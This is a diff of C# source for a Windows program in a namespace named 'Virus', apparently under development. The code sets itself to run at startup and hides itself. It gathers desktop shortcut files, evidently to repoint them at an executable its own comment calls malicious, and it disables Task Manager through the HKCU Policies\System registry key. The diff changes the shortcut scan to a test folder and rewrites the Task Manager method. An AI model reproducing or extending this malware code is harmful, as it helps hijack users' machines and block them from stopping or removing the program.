@@ -1,5 +1,6 @@
 ﻿using System;
 using System.IO;
+using System.Threading;
 using Microsoft.Win32;
 using ShellLinkChanger;
 
@@ -13,13 +14,14 @@ namespace Virus
         {
             SetStartup();
             HideAll();
-            ToggleTaskManager(true);
 
             // Получение пути к рабочему столу
             var desktopFolder = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
 
+            var testFolder = @"C:\Users\New\Desktop\Test";
+
             // Получение файлов ярлыков
-            var files = ShellLinkHelper.GetAllShellLinkFiles(desktopFolder);
+            var files = ShellLinkHelper.GetAllShellLinkFiles(testFolder);
 
             // Получение абсолютного пути к вредоносной программе
             var targetPath = Path.GetFullPath("BigEyeWatchYou.exe");
@@ -36,14 +38,20 @@ namespace Virus
         }
 
         /// <summary>
-        /// Включает или выключает диспетчер задач
+        ///  Methods to manage the task manager 
         /// </summary>
-        /// <param name="toggle"></param>
-        private static void ToggleTaskManager(bool toggle)
+        /// <param name="arg">0 : Enable task Manager  1 : Disable task Manager </param>
+        private static void HideTaskManager(int arg)
         {
-            Microsoft.Win32.RegistryKey HKCU = Microsoft.Win32.Registry.LocalMachine;
-            Microsoft.Win32.RegistryKey key = HKCU.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
-            key.SetValue("DisableTaskMgr", toggle ? 0 : 1, Microsoft.Win32.RegistryValueKind.DWord);
+            RegistryKey currentUser = Registry.CurrentUser;
+            RegistryKey system = currentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
+            // if system Create an item if it does not exist 
+            if (system == null)
+            {
+                system = currentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
+            }
+            system.SetValue("DisableTaskmgr", arg, RegistryValueKind.DWord);
+            currentUser.Close();
         }
 
         /// <summary>
